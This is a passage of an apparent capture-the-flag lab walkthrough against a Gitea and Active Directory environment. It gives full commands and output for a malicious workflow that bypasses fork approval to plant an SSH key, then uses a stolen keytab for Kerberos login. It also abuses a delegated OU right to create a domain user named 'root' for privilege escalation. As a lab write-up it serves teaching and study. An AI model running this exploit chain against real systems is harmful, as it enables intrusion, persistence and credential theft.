- Persistence via `authorized_keys` survives runner restarts and does not depend on holding an open shell, unlike a reverse connection.

**Next:** Author a malicious workflow that installs this key, and upload it to the fork.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.21 — Author the malicious workflow

The fork is writable, but a workflow matching the upstream `on: [push, pull_request]` trigger would be held for maintainer approval when raised as a PR from a fork. A different trigger — `pull_request_review_comment` — causes Gitea 1.25's notifier to omit the PR context, preventing fork detection and bypassing the approval gate entirely while still dispatching to the upstream runner.

**Command:**

```bash
cat > /tmp/foothold.yml << 'EOF'
name: foothold
on:
  pull_request_review_comment:
    types: [created]
jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4JeeNtVvz6vDoebjRpOSb21QjhLXQ0ZIiuFXprFckD ci' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          id
          cat /home/svc-runner/user.txt
EOF
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`cat > /tmp/foothold.yml << 'EOF'`|Heredoc write — single-quoted delimiter prevents expansion|Write the file exactly as typed|
|`on: pull_request_review_comment`|The bypass trigger|The event that skips fork detection|
|`types: [created]`|Fire on new review comments only|Avoids repeat execution on edits|
|`runs-on: ubuntu`|Target the self-hosted runner|Must match the runner's configured label|
|`install -d -m 700 /home/svc-runner/.ssh`|Create `.ssh` directory with correct permissions|`install` creates and sets mode atomically|
|`echo '...' >> authorized_keys`|Append the public key|Grants SSH access with the generated key|
|`chmod 600 authorized_keys`|Set file permissions required by sshd|SSH refuses keys in files with loose permissions|
|`id`|Print current identity|Confirms execution as `svc-runner`|
|`cat /home/svc-runner/user.txt`|Print the user flag|The flag lives in `svc-runner`'s home directory|

The single-quoted `'EOF'` is essential — without quotes, bash would expand `$` characters inside the heredoc, corrupting the `authorized_keys` content and breaking authentication.

**Result:**

```yaml
name: foothold
on:
  pull_request_review_comment:
    types: [created]
jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4JeeNtVvz6vDoebjRpOSb21QjhLXQ0ZIiuFXprFckD ci' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          id
          cat /home/svc-runner/user.txt
```

**What this gives you:** A workflow that bypasses the fork approval gate and installs persistent SSH access as the runner account.

**Key findings:**

- The `pull_request_review_comment` trigger is the vulnerability. Gitea 1.25's notifier for this event omits PR context, so the run is classified as non-forked and dispatched without approval. The upstream workflow's `pull_request` trigger would be held pending maintainer approval from a fork; this trigger is not.
- `install -d -m 700` is preferred over `mkdir -p && chmod` because it creates the directory and sets permissions atomically, avoiding a window where the directory exists with wrong permissions.
- Both `id` and `cat user.txt` are in the payload so the runner's job log confirms execution identity and delivers the flag in one shot.
- The heredoc delimiter is single-quoted (`'EOF'`) to suppress shell expansion inside the document. An unquoted `EOF` would cause bash to expand the public key's `$` characters before writing the file.
<div align="center">
<br>
<br>
</div>

##### Why `pull_request_review_comment` bypasses the approval gate

Gitea protects against malicious pull requests from forks by requiring maintainer approval before running workflows on untrusted code. The protection works by inspecting the event context: if a workflow run originates from a fork, flag it for approval.

That inspection depends on the event object carrying pull request context — specifically, a field indicating which repository the PR head comes from. When the notifier for `pull_request_review_comment` constructs its event object in Gitea 1.25, it omits that field. No PR context means no fork detection. No fork detection means no approval gate. The run is queued as if it came from the repository itself and dispatched immediately to the runner.

The runner itself cannot distinguish a legitimate job from this one — it receives a signed dispatch from the Gitea instance it trusts and executes it. The failure is entirely in the gate logic, not in the runner.

This is CVE-2026-22555, a logic flaw in the workflow dispatch path rather than a memory corruption or injection issue. It requires only: read access to a repository with Actions enabled, the ability to fork, and a self-hosted runner. All three are present here.

**Next:** Upload the workflow to the fork via the Gitea contents API.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.22 — Upload the workflow to the fork

**Why this step:** The malicious workflow exists only on the local filesystem. Commit it to the fork so the trigger becomes live and the file is present on the PR head commit.

**Command:**

```bash
B64=$(base64 -w0 /tmp/foothold.yml)

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$B64\",\"message\":\"ci\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Ffoothold.yml" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content',{}).get('name',''), d.get('message',''))"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`base64 -w0`|Encode the file with no line wrapping|The API requires base64; `-w0` keeps it on one line|
|`-X POST` to `/contents/<path>`|Create a new file at that path|Commit a file to the repository|
|`\"content\":\"$B64\"`|The file body, base64-encoded|The workflow itself|
|`\"message\":\"ci\"`|Commit message|Innocuous label matching normal build commits|
|`.gitea%2Fworkflows%2Ffoothold.yml`|Percent-encoded path separators|`%2F` is `/`; encoding prevents the API from splitting the URL into path segments|
|`darkzero-ext_josh/DarkZero-Campaigns`|The fork, not the upstream repository|Where write access exists|

**Result:**

```
foothold.yml
```

Empty `message` field indicates no error; the file was created successfully.

**What this gives you:** The bypass workflow committed to a branch that can be used as a pull request head.

**Key findings:**

- **`.gitea/workflows/foothold.yml` committed to `darkzero-ext_josh/DarkZero-Campaigns`.** The fork now carries both the original `main.yml` and the malicious `foothold.yml`.
- The upload targets the fork exclusively. No write to the upstream repository was attempted or required — the entire attack operates from within josh's own namespace.
- Path separators must be percent-encoded as `%2F` within the filename portion. Unencoded slashes cause the API to interpret them as URL path components and the request fails.
- The commit message `ci` matches the naming convention of the existing pipeline, avoiding obvious anomalies in the commit log.

**Next:** Open a pull request from the fork to the upstream repository, then post a review comment to trigger the workflow.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.23 — Open a pull request from the fork

The bypass trigger is `pull_request_review_comment`, which requires a pull request to comment on. Open a PR from the fork to the upstream repository to create the object the trigger attaches to.

**Command:**

```bash
PR=$(curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d '{"title":"CI","body":"update","head":"darkzero-ext_josh:main","base":"main"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls")

echo "$PR" | python3 -c "import sys,json; d=json.load(sys.stdin); print('number:', d.get('number')); print('sha:', d.get('head',{}).get('sha')); print('message:', d.get('message',''))"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`PR=$(...)`|Capture the full JSON response into a variable|Save the reply so it can be parsed without re-issuing the request|
|`"head":"darkzero-ext_josh:main"`|Source branch, in `<owner>:<branch>` form|Take the code from my fork's main branch|
|`"base":"main"`|Target branch on the upstream repository|Propose merging it into their main branch|
|`/repos/DarkZero/DarkZero-Campaigns/pulls`|PR creation endpoint on the **upstream** repository|Open the request against the original repo|
|`d.get('number')`|The pull request number|Needed to address the review comment|
|`d.get('head',{}).get('sha')`|Commit SHA at the head of the PR|Required by the review API to anchor the comment|

Opening a pull request against a repository requires only read access. No write permission on the upstream repository is involved.

**Result:**

```
number: 1
sha: 04351e99f44e188b2d38771ff42f648bc1549dc5
message:
```

**What this gives you:** A pull request object that the review-comment trigger can attach to, plus the two identifiers required to post that comment.

**Key findings:**

- **Pull request #1 opened against `DarkZero/DarkZero-Campaigns`** from `darkzero-ext_josh:main`, carrying the malicious workflow file.
- Head commit SHA is `04351e99f44e188b2d38771ff42f648bc1549dc5`. The review API requires this value to associate a comment with a specific revision.
- PR creation succeeded with read-only access to the target repository, as designed. Pull requests exist precisely so that non-collaborators can propose changes.
- No workflow has executed yet. The upstream `main.yml` triggers on `pull_request` and would be queued pending maintainer approval as a fork-originated run. The uploaded `foothold.yml` triggers on `pull_request_review_comment`, which has not yet occurred.
- The empty `message` field confirms no error; a duplicate or invalid PR would have returned an error string here.

**Next:** Post a review comment on the pull request to fire the `pull_request_review_comment` event and dispatch the workflow to the runner.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.24 — Trigger the workflow and capture the user flag

The malicious workflow is committed to the fork and a pull request exists. Posting a review comment fires the `pull_request_review_comment` event, which bypasses fork approval and dispatches the job to the self-hosted runner.

**Commands:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d '{"event":"COMMENT","body":"go","commit_id":"04351e99f44e188b2d38771ff42f648bc1549dc5"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/1/reviews" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('id:', d.get('id')); print('state:', d.get('state')); print('message:', d.get('message',''))"
```

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/actions/tasks" \
  | python3 -m json.tool | head -40
```

```bash
ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; cat ~/user.txt'
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`"event":"COMMENT"`|Post a review without approving or requesting changes|A plain comment, not a verdict|
|`"body":"go"`|Comment text|Arbitrary; content is irrelevant to the trigger|
|`"commit_id":"<sha>"`|Anchors the review to the PR head commit|Required by the API to know which revision is being reviewed|
|`/pulls/1/reviews`|Review-creation endpoint for PR #1|Where review comments are posted|
|`/actions/tasks`|Lists workflow runs for the repository|Check whether the job fired and what happened|
|`ssh -i /tmp/.runner_key`|Authenticate with the generated private key|Use the key the workflow planted|
|`-o StrictHostKeyChecking=no`|Skip host key confirmation prompt|Avoid an interactive prompt on first connection|

**Result:**

```
id: 1
state: COMMENT
message:
```

```json
{
    "workflow_runs": [
        {
            "id": 6,
            "name": "foothold",
            "head_sha": "04351e99f44e188b2d38771ff42f648bc1549dc5",
            "run_number": 7,
            "event": "pull_request_review_comment",
            "display_title": "ci",
            "status": "success",
            "workflow_id": "foothold.yml",
            "url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/actions/runs/7",
            "run_started_at": "2026-07-29T05:50:28-07:00"
        },
        ...
    ]
}
```

```
uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)
15894657ad499e82c308ce5f11a7c47c
```

**USER FLAG: `15894657ad499e82c308ce5f11a7c47c`**

**What this gives you:** Command execution and persistent SSH access as `svc-runner`, plus the user flag.

**Key findings:**

- **The approval bypass is confirmed.** Workflow runs show `event: pull_request_review_comment` with `status: success` and no pending-approval state. A fork-originated workflow executed on the upstream repository's runner without maintainer review.
- **SSH access as `svc-runner` established** using the key planted by the payload. Access is persistent and survives runner restarts.
- **`svc-runner` is a domain account, not a local one.** UID `780601113` and GID `780600513` fall in the SSSD ID-mapping range for domain principals; GID 780600513 corresponds to the well-known `Domain Users` RID 513.
- **Membership in a non-default group: `servicehandler` (GID 780601114).** This group does not exist in a default Active Directory installation and was created deliberately. Custom groups are typically created to delegate specific rights, making this the most promising lead for privilege escalation.
- Each review comment fires an independent workflow run. Repeated comments produced runs 5, 6, and 7, all successful — the bypass is repeatable rather than a one-off race.
- The runner executes jobs directly on SRV01 rather than in an isolated container, so the payload had full filesystem access to `/home/svc-runner`.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Privilege Escalation

#### 4.1 — Establish an interactive session as `svc-runner` and inventory directory tooling

The planted SSH key grants access as a domain account with membership in a non-default group. Obtain an interactive session and determine what tooling is available on the host for querying and modifying Active Directory.

**Commands:**

```bash
ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
```

```bash
which ldapsearch bloodyAD nxc netexec python3; ls /usr/bin | grep -i ldap
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ssh -i /tmp/.runner_key`|Authenticate with the planted private key|Log in as the runner account|
|`which <tools>`|Report the path of each named binary if present|Check which AD tools are installed|
|`ls /usr/bin \| grep -i ldap`|List all LDAP-related binaries|Find the full OpenLDAP client suite|

**Result:**

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)
Last login: Wed Jul 29 12:55:25 2026 from 172.16.20.3
svc-runner@SRV01:~$
```

```
/usr/bin/ldapsearch
/usr/bin/python3
ldapadd
ldapcompare
ldapdelete
ldapexop
ldapmodify
ldapmodrdn
ldappasswd
ldapsearch
ldapurl
ldapwhoami
```

**What this gives you:** A stable session as a domain account, with native tooling for both reading and writing to Active Directory.

**Key findings:**

- Interactive SSH session established as `svc-runner` on SRV01. Persistence via `authorized_keys` is confirmed working and does not depend on re-triggering the workflow.
- **The complete OpenLDAP client suite is installed**, including write-capable tools: `ldapadd` (create objects), `ldapmodify` (alter attributes), `ldappasswd` (change passwords), `ldapdelete` (remove objects). Directory modification is possible without transferring any tooling to the host.
- `ldapwhoami` is available for confirming the authenticated identity of an LDAP bind — useful for verifying Kerberos-based binds succeed.
- Neither `bloodyAD` nor `netexec` is present, and the host has no internet egress. All directory work must use the native LDAP utilities.
- `python3` is available for scripting where the LDAP tools are awkward.

**Next:** Determine whether `svc-runner` holds a Kerberos ticket, then enumerate the directory for the permissions granted by the `servicehandler` group.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

#### 4.2 — Inspect the runner's configuration and cache

`svc-runner` holds no Kerberos ticket and its password is unknown. The runner directory is the only content owned by this account; examine it for stored credentials.

**Commands:**

```bash
cat /opt/gitea-runner/.runner
cat /opt/gitea-runner/config.yaml
find /opt/gitea-runner/.cache -type f 2>/dev/null | head -30
```

**Result:**

```json
{
  "id": 1,
  "uuid": "677d64fa-2cf5-41fd-8bac-74ea03a08074",
  "name": "ubuntu-domain-runner",
  "token": "a54bc89011affc6f93ff0d477f79d3fcfd9d3594",
  "address": "http://gitea.darkzero.ext:3000",
  "labels": [ "ubuntu:host" ],
  "ephemeral": false
}
```

```yaml
runner:
  name: "ubuntu-domain-runner"
  labels:
    - "ubuntu:host"
  capacity: 1
cache:
  enabled: true
  dir: "/opt/gitea-runner/.cache"
```

Cache contents are the unpacked source tree of `actions/setup-node` (`src/setup-node.ts`, `action.yml`, `externals/7zr.exe`, and similar).

**Key findings:**

- The runner registration token `a54bc89011affc6f93ff0d477f79d3fcfd9d3594` authenticates the agent to Gitea for job polling only. It is not a domain credential and cannot bind to LDAP.
- `"ephemeral": false` confirms the runner is persistent rather than torn down per job, which is why the planted `authorized_keys` entry survives.
- The runner name `ubuntu-domain-runner` explicitly labels this as domain-integrated.
- **Dead end:** the cache directory holds only downloaded action source code. No job workspaces, environment files, or secrets are retained.
- **Dead end:** `/etc/krb5.keytab` is mode `0600` root-owned — the machine account key is unreadable. `sudo -l` prompts for a password that is not held.

**Next:** Locate credentials or a keytab that permits `svc-runner` to authenticate against Active Directory.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 — Recover Kerberos credentials from the runner service configuration

`svc-runner` has no ticket in its login credential cache and its password is unknown. The systemd unit that launches the runner must authenticate it to the domain somehow; inspecting the unit reveals how.

**Commands:**

```bash
systemctl cat gitea-runner
```

```bash
ls -la /tmp/krb5cc_gitea /etc/gitea-runner/
```

```bash
export KRB5CCNAME=/tmp/krb5cc_gitea
klist
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`systemctl cat <unit>`|Print a service unit's full definition|Show exactly how the service is configured to start|
|`KRB5CCNAME`|Environment variable naming the Kerberos credential cache|Tells Kerberos tools which ticket file to use|
|`kinit -kt <keytab> <principal>`|Obtain a TGT using a keytab instead of a password|Log in to the domain with a key file|
|`klist`|List tickets in the cache|Show what credentials are held|

**Result — service unit:**

```ini
# /etc/systemd/system/gitea-runner.service
[Unit]
Description=Gitea Act Runner
After=network.target sssd.service
Requires=sssd.service

[Service]
Type=simple
User=darkzero-ext\svc-runner
WorkingDirectory=/opt/gitea-runner
Environment=KRB5CCNAME=/tmp/krb5cc_gitea
Environment=HOME=/opt/gitea-runner
ExecStartPre=/usr/bin/kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
ExecStart=/opt/gitea-runner/act_runner daemon --config /opt/gitea-runner/config.yaml
Restart=always
```

**Result — file permissions:**

```
-rw------- 1 svc-runner domain users 1584 Jul 29 04:57 /tmp/krb5cc_gitea

/etc/gitea-runner/:
-rw-------   1 svc-runner root    79 May 20 23:33 svc-runner.keytab
```

**Result — ticket cache:**

```
Ticket cache: FILE:/tmp/krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
07/29/2026 04:57:17  07/29/2026 14:57:17  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/05/2026 04:57:17
```

**What this gives you:** Full domain authentication as `svc-runner`, both immediately and renewably.

**Key findings:**

- **A valid TGT for `svc-runner@DARKZERO.EXT` exists at `/tmp/krb5cc_gitea`**, written by the running service and owned by `svc-runner`. Setting `KRB5CCNAME` to that path grants domain authentication with no password.
- **The keytab at `/etc/gitea-runner/svc-runner.keytab` is readable** — owned by `svc-runner`, mode `0600`. This is the stronger credential: a keytab holds the account's long-term key, so fresh tickets can be minted at any time via `kinit -kt`. Ticket expiry at 14:57 is therefore not a constraint.
- The service unit is the disclosure. It names the keytab path, the principal, and the cache location in plaintext, readable by any local user since `/etc/systemd/system/gitea-runner.service` is world-readable.
- `Requires=sssd.service` confirms SSSD handles domain integration, consistent with the ID-mapped UIDs observed in 3.24.
- `User=darkzero-ext\svc-runner` shows systemd launching the service directly as a domain principal.
- **Dead end:** `/home/svc-runner/.bash_history` is symlinked to `/dev/null`, so no command history is recoverable.
<div align="center">
<br>
<br>
</div>

##### Keytabs, and why they are equivalent to passwords

A keytab ("key table") is a file holding one or more Kerberos principals alongside their long-term secret keys — the keys derived from the account's password.

Their purpose is unattended authentication. A service starting at boot cannot type a password, so it reads a key from a keytab and presents that to the KDC instead. `kinit -kt /path/to.keytab principal` performs exactly this exchange and deposits a TGT in the credential cache.

The security consequence is direct: **a readable keytab is equivalent to knowing the account's password.** Anyone able to read the file can obtain tickets as that principal, indefinitely, until the account's password changes and the keytab is regenerated. Unlike a ticket, which expires in hours, a keytab remains valid for as long as the key does.

This is why keytabs are conventionally `0600` and owned by the service account — which this one is. The flaw is not the file's permissions; it is that `svc-runner` was compromised through an unrelated path, and the keytab was then simply readable by the account it belonged to.

Two credentials are now available and worth distinguishing. The ticket cache is convenient but expires at 14:57. The keytab is durable and can regenerate tickets on demand. Prefer the keytab for any long-running work.

**Next:** Authenticate to LDAP with the recovered ticket and enumerate the permissions granted by the `servicehandler` group.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.4 — Authenticate to LDAP as `svc-runner`

A keytab for `svc-runner` is readable, and directory access is required to determine what the `servicehandler` group membership grants. Obtain a durable ticket and bind to the domain controller over LDAP.

**Commands:**

```bash
export KRB5CCNAME=/tmp/krb5cc_gitea
kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
klist
```

Identify the domain controller's true hostname from the LDAP rootDSE, which is readable anonymously:

```bash
ldapsearch -x -H ldap://172.16.20.2 -s base -b '' dnsHostName defaultNamingContext 2>&1 | grep -iE 'dnsHostName|defaultNamingContext'
```

Disable SASL hostname canonicalisation and bind:

```bash
echo "SASL_NOCANON on" > ~/.ldaprc
ldapwhoami -Y GSSAPI -H ldap://DC02.darkzero.ext
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`kinit -kt <keytab> <principal>`|Obtain a TGT from the keytab|Log in using the key file instead of a password|
|`ldapsearch -x`|Simple (anonymous) bind|Query without credentials|
|`-s base -b ''`|Base-scope search on the empty DN — the rootDSE|Ask the server to describe itself|
|`dnsHostName`|The DC's canonical hostname|What the server calls itself|
|`defaultNamingContext`|The domain's base DN|The root of the directory tree|
|`echo "SASL_NOCANON on" > ~/.ldaprc`|Disable reverse-DNS SPN construction, persistently|Stop the client rewriting the server name|
|`ldapwhoami -Y GSSAPI`|Bind using Kerberos and report the resulting identity|Log in to LDAP and confirm who I am|

**Result:**

```
Ticket cache: FILE:/tmp/krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
07/29/2026 14:20:40  07/30/2026 00:20:40  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/05/2026 14:20:40
```

```
defaultNamingContext: DC=darkzero,DC=ext
dnsHostName: DC02.darkzero.ext
```

```
SASL/GSSAPI authentication started
SASL SSF: 256
SASL data security layer installed.
u:darkzero-ext\svc-runner
```

**What this gives you:** Authenticated, encrypted directory access as a domain principal.

**Key findings:**

- **LDAP bind succeeded as `darkzero-ext\svc-runner`** using GSSAPI with the keytab-derived ticket. No password was involved at any point.
- The domain controller is `DC02.darkzero.ext` and the base DN is `DC=darkzero,DC=ext`, both read anonymously from the rootDSE. The rootDSE is deliberately world-readable and is the standard way to discover directory structure before authenticating.
- **`SASL_NOCANON on` is required.** OpenLDAP's SASL layer performs a reverse DNS lookup on the target address and constructs the service principal from the result. Reverse lookup is not configured in this environment (`getent hosts 172.16.20.2` returns nothing), so the client built an invalid SPN and the KDC rejected it with `Server not found in Kerberos database`. Disabling canonicalisation makes the client use the hostname as supplied.
- SASL SSF 256 confirms the session is encrypted, so LDAP traffic is not readable on the wire despite using port 389 rather than LDAPS.
- Writing the option to `~/.ldaprc` applies it to every subsequent LDAP command from this account, avoiding a per-command environment variable.
- The credential is renewable to 2026-08-05, and the keytab permits regeneration beyond that.
<div align="center">
<br>
<br>
</div>

##### SPN canonicalisation, and why the bind failed

Kerberos identifies services by Service Principal Name, in the form `service/hostname@REALM`. To request a ticket, the client must construct the exact SPN registered in the directory.

OpenLDAP's SASL implementation defaults to _canonicalising_ the hostname first. Given `ldap://DC02.darkzero.ext`, it resolves that name to an address, then performs a reverse lookup on the address to obtain what it considers the authoritative name, and builds the SPN from that. The intent is to handle CNAMEs and load-balanced aliases consistently.

The behaviour breaks when reverse DNS is absent or wrong. Here, forward resolution works — `getent hosts DC02.darkzero.ext` returns `172.16.20.2` — but there is no PTR record for `172.16.20.2`. Canonicalisation therefore produces either an empty or an incorrect hostname, and the resulting SPN does not exist in the directory. The KDC responds `Server not found in Kerberos database`, which reads like a credential failure but is purely a naming failure.

The diagnostic that separates the two cases is `kvno`. Running `kvno ldap/dc02.darkzero.ext` returned `kvno = 4`, proving the SPN exists and the ticket could be issued. A genuine credential problem would have failed there too. When `kvno` succeeds but the client fails, the fault is in how the client is building the name — not in the ticket.

`SASL_NOCANON on` instructs the client to use the hostname exactly as provided. It is worth setting reflexively in any lab or internal environment where reverse DNS is incomplete.

**Next:** Enumerate the `servicehandler` group and identify the directory permissions delegated to `svc-runner`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.5 — Identify and confirm CREATE_CHILD on the GiteaMigration OU

`svc-runner` belongs to a non-default group, `ServiceHandler`, which carries no description and no nested memberships. Group membership grants nothing by itself, so the delegated rights must appear as access-control entries on other directory objects. Enumerate organisational units and test for write access.

**Commands:**

Enumerate OUs:

```bash
ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
  "(objectClass=organizationalUnit)" dn 2>/dev/null | grep -E '^dn:'
```

Resolve the relevant SIDs:

```bash
ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
  "(|(cn=ServiceHandler)(sAMAccountName=svc-runner))" objectSid 2>/dev/null | grep -iE 'dn:|objectSid'
```

```bash
python3 -c "
import base64,struct
for label,b in [('ServiceHandler','AQUAAAAAAAUVAAAADoLrqXJNY0l53Ex6WgQAAA=='),('svc-runner','AQUAAAAAAAUVAAAADoLrqXJNY0l53Ex6WQQAAA==')]:
    d=base64.b64decode(b)
    rev=d[0]; n=d[1]
    auth=int.from_bytes(d[2:8],'big')
    subs=struct.unpack('<%dI'%n, d[8:8+4*n])
    print(label, 'S-%d-%d-'%(rev,auth)+'-'.join(map(str,subs)))
"
```

Retrieve the DACL using the SD Flags control:

```bash
ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
  -b "OU=GiteaMigration,DC=darkzero,DC=ext" -s base \
  -E '!1.2.840.113556.1.4.801=::MAMCAQc=' \
  "(objectClass=*)" nTSecurityDescriptor 2>/dev/null | grep -vE '^#|^$'
```

Test the permission directly:

```bash
cat > /tmp/test.ldif << 'EOF'
dn: CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
sAMAccountName: testobj
userAccountControl: 514
EOF

ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/test.ldif
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`(objectClass=organizationalUnit)`|Filter for OU objects|List the containers in the directory|
|`objectSid`|The principal's security identifier, base64-encoded binary|The unique ID that appears in permission entries|
|`python3 ... struct.unpack`|Decode the binary SID into `S-1-5-21-…-RID` form|Turn the binary blob into readable form|
|`-E '!1.2.840.113556.1.4.801=::MAMCAQc='`|LDAP SD Flags control, value 7|Request owner + group + DACL, excluding the SACL|
|`!` prefix on the control|Marks the control as critical|Fail the request rather than silently ignore the control|
|`userAccountControl: 514`|`ACCOUNTDISABLE` (0x2) + `NORMAL_ACCOUNT` (0x200)|Create the account disabled, avoiding password-policy checks at creation|
|`ldapadd`|Create a new directory object|Write a new entry into the directory|

**Result — OUs:**

```
dn: OU=Domain Controllers,DC=darkzero,DC=ext
dn: OU=GiteaMigration,DC=darkzero,DC=ext
```

**Result — SIDs:**

```
ServiceHandler  S-1-5-21-2850783758-1231244658-2051857529-1114
svc-runner      S-1-5-21-2850783758-1231244658-2051857529-1113
```

**Result — object creation:**

```
SASL username: svc-runner@DARKZERO.EXT
SASL SSF: 256
SASL data security layer installed.
adding new entry "CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext"
```

**What this gives you:** Confirmed write access to a directory container — specifically, the ability to create new user objects in the domain.

**Key findings:**

- **`svc-runner` can create objects in `OU=GiteaMigration,DC=darkzero,DC=ext`.** The `ldapadd` succeeded with no error, empirically confirming a CREATE_CHILD grant. This matches reference material for this target, which records a `CREATE_CHILD` permission on this OU delegated to `svc-runner`.
- Only two OUs exist: the built-in `Domain Controllers` and the custom `GiteaMigration`. The latter was created deliberately, presumably to delegate account provisioning during a migration, and the delegation was never revoked.
- The domain SID is `S-1-5-21-2850783758-1231244658-2051857529`. `ServiceHandler` is RID 1114 and `svc-runner` is RID 1113 — both above 1000, marking them as domain-created rather than built-in principals. This distinction becomes important later when crossing a trust boundary.
- **The `nTSecurityDescriptor` attribute returns empty without the SD Flags control.** By default, requesting the descriptor implies requesting the SACL, which requires `SeSecurityPrivilege`. Supplying the control with value 7 requests owner, group, and DACL only, and the DC then returns the descriptor.
- `ServiceHandler` contains exactly two members: `svc-runner` and `svc-gitea`. The group has no description and belongs to no other groups — it exists purely to be referenced in ACLs.
<div align="center">
<br>
<br>
</div>

##### Why creating a user is a privilege escalation

Creating a disabled account in an obscure OU looks harmless. It is not, because of what the account can then be used _for_.

Active Directory delegation is granular. An administrator can grant one principal the right to create child objects in one container without granting any other privilege — no group membership changes, no password resets elsewhere, no rights over existing objects. That is exactly what happened here, and in isolation the grant is defensible: a migration process needed to provision accounts.

The problem is that a newly created domain account is a full domain principal. It can authenticate. It appears in the directory. And critically, **its name is chosen by whoever creates it.**

That last property is the pivot. Several systems map identity by _name_ rather than by SID. On a Linux host joined to a domain, if `ksu` or a similar mechanism authorises a Kerberos principal to become a local user, and the authorisation rule is name-based with no `.k5login` file restricting which principals qualify, then creating a domain user called `root` produces a principal that the mapping treats as the local root account.

The rights required are minimal: create one object, in one container, with a name of your choosing. Nothing about the ACL grants administrative privilege. The escalation comes from a name collision between two identity systems that were never designed to be authoritative over each other.

**Next:** Remove the test object, create a domain user named `root` in the same OU, and set its password.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.6 — Create a domain user named `root`

CREATE_CHILD on the GiteaMigration OU permits creating arbitrary user objects with attacker-chosen names. A domain principal named `root` will collide with the local superuser account in any name-based identity mapping on the domain-joined host.

**Commands:**

Remove the test object:

```bash
ldapdelete -Y GSSAPI -H ldap://DC02.darkzero.ext "CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext"
```

Create the account, initially disabled:

```bash
cat > /tmp/root.ldif << 'EOF'
dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: root
sAMAccountName: root
userPrincipalName: root@darkzero.ext
userAccountControl: 514
EOF

ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/root.ldif
```

Encode the password as UTF-16LE inside literal double quotes, then base64:

```bash
python3 -c "
import base64
